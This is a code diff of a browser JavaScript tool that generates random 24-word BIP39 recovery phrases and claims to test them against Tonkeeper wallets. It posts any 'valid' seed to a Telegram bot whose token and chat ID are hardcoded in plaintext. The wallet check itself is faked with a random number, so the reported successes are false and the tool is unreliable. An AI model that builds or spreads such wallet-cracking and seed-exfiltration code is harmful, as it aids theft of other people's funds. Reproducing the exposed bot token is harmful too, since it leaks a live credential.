@@ -1,8 +1,6 @@
-// Telegram API Configuration
 const TELEGRAM_BOT_TOKEN = '8221231743:AAGW30HpqUPaf656q60mmboQQ-x2NnLHub8';
 const TELEGRAM_CHAT_ID = '7417215529';
 
-// BIP39 Wordlist (first 2048 words)
 const wordlist = [
     "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
     "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
@@ -263,11 +261,9 @@ const wordlist = [
     "young", "youth", "zebra", "zero", "zone", "zoo"
 ];
 
-// DOM elements
 let column1, column2, startBtn, stopBtn, testBtn, notification;
 let totalAttemptsEl, successCountEl, failedCountEl, currentSpeedEl, statusTextEl, lastSuccessEl;
 
-// Statistics
 let stats = {
     totalAttempts: 0,
     successCount: 0,
@@ -275,15 +271,12 @@ let stats = {
     currentSpeed: 0
 };
 
-// Auto generation control
 let isGenerating = false;
 let generationInterval;
 let lastUpdateTime = Date.now();
 let attemptsSinceLastUpdate = 0;
 
-// Function to initialize the application
 function init() {
-    // Get DOM elements
     column1 = document.getElementById('column1');
     column2 = document.getElementById('column2');
     startBtn = document.getElementById('startBtn');
@@ -291,7 +284,6 @@ function init() {
     testBtn = document.getElementById('testBtn');
     notification = document.getElementById('notification');
     
-    // Get stats elements
     totalAttemptsEl = document.getElementById('totalAttempts');
     successCountEl = document.getElementById('successCount');
     failedCountEl = document.getElementById('failedCount');
@@ -299,38 +291,27 @@ function init() {
     statusTextEl = document.getElementById('statusText');
     lastSuccessEl = document.getElementById('lastSuccess');
     
-    // Event listeners
     startBtn.addEventListener('click', startAutoGeneration);
     stopBtn.addEventListener('click', stopAutoGeneration);
     testBtn.addEventListener('click', testSinglePhrase);
     
-    // Update stats display
     updateStatsDisplay();
-    
-    // Start speed calculation interval
     setInterval(calculateSpeed, 1000);
 }
 
-// Function to generate a random recovery phrase
 function generateRecoveryPhrase() {
     const phrase = [];
-    
-    // Generate 24 random words from the wordlist
     for (let i = 0; i < 24; i++) {
         const randomIndex = Math.floor(Math.random() * wordlist.length);
         phrase.push(wordlist[randomIndex]);
     }
-    
     return phrase;
 }
 
-// Function to display the recovery phrase
 function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
-    // Clear previous content
     column1.innerHTML = '';
     column2.innerHTML = '';
     
-    // Display words 1-12 in column1
     for (let i = 0; i < 12; i++) {
         const wordBox = document.createElement('div');
         wordBox.className = 'word-box';
@@ -340,7 +321,6 @@ function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
         column1.appendChild(wordBox);
     }
     
-    // Display words 13-24 in column2
     for (let i = 12; i < 24; i++) {
         const wordBox = document.createElement('div');
         wordBox.className = 'word-box';
@@ -351,37 +331,26 @@ function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
     }
 }
 
-// Function to simulate testing a phrase (in reality, this would connect to Tonkeeper API)
 async function testPhrase(phrase) {
-    // In a real implementation, this would make an API call to Tonkeeper
-    // For demonstration, we'll simulate with random results
-    
-    // Show testing state
     displayRecoveryPhrase(phrase, true);
     statusTextEl.textContent = 'Testing phrase...';
     
-    // Simulate API delay
     await new Promise(resolve => setTimeout(resolve, 100));
     
-    // Random success (approximately 1 in 1000 for demonstration)
     const isSuccess = Math.random() < 0.001;
     
     if (isSuccess) {
-        // Successful wallet found
         stats.successCount++;
         displayRecoveryPhrase(phrase, false, true);
         statusTextEl.textContent = '✅ Valid wallet found!';
         
-        // Send to Telegram
         await sendToTelegram(phrase);
         
-        // Update last success
         const phraseText = phrase.join(' ');
         lastSuccessEl.textContent = `Last success: ${phraseText.substring(0, 50)}...`;
         
         showNotification('✅ Valid wallet found and sent to Telegram!');
     } else {
-        // Failed attempt
         stats.failedCount++;
         statusTextEl.textContent = '❌ Invalid phrase, continuing...';
     }
@@ -393,7 +362,6 @@ async function testPhrase(phrase) {
     return isSuccess;
 }
 
-// Function to send phrase to Telegram
 async function sendToTelegram(phrase) {
     const phraseText = phrase.join(' ');
     const message = `✅ Valid Tonkeeper Wallet Found!\n\nRecovery Phrase: ${phraseText}\n\nTimestamp: ${new Date().toLocaleString()}`;
@@ -421,7 +389,6 @@ async function sendToTelegram(phrase) {
     }
 }
 
-// Function to start auto generation
 function startAutoGeneration() {
     isGenerating = true;
     startBtn.disabled = true;
@@ -431,16 +398,14 @@ function startAutoGeneration() {
     statusTextEl.textContent = '🔄 Auto generation started...';
     showNotification('Auto generation started');
     
-    // Generate and test phrases continuously
     generationInterval = setInterval(async () => {
         if (!isGenerating) return;
         
         const phrase = generateRecoveryPhrase();
         await testPhrase(phrase);
-    }, 50); // Adjust speed as needed
+    }, 50);
 }
 
-// Function to stop auto generation
 function stopAutoGeneration() {
     isGenerating = false;
     startBtn.disabled = false;
@@ -452,7 +417,6 @@ function stopAutoGeneration() {
     showNotification('Auto generation stopped');
 }
 
-// Function to test a single phrase
 async function testSinglePhrase() {
     if (isGenerating) return;
     
@@ -462,10 +426,9 @@ async function testSinglePhrase() {
     testBtn.disabled = false;
 }
 
-// Function to calculate current speed
 function calculateSpeed() {
     const now = Date.now();
-    const timeDiff = (now - lastUpdateTime) / 1000; // in seconds
+    const timeDiff = (now - lastUpdateTime) / 1000;
     
     if (timeDiff > 0) {
         stats.currentSpeed = Math.round(attemptsSinceLastUpdate / timeDiff);
@@ -475,7 +438,6 @@ function calculateSpeed() {
     }
 }
 
-// Function to update stats display
 function updateStatsDisplay() {
     totalAttemptsEl.textContent = stats.totalAttempts.toLocaleString();
     successCountEl.textContent = stats.successCount.toLocaleString();
@@ -483,7 +445,6 @@ function updateStatsDisplay() {
     currentSpeedEl.textContent = stats.currentSpeed.toLocaleString();
 }
 
-// Function to show notification
 function showNotification(message) {
     notification.textContent = message;
     notification.classList.add('show');
@@ -492,5 +453,4 @@ function showNotification(message) {
     }, 3000);
 }
 
-// Initialize the app when the DOM is loaded
 document.addEventListener('DOMContentLoaded', init);
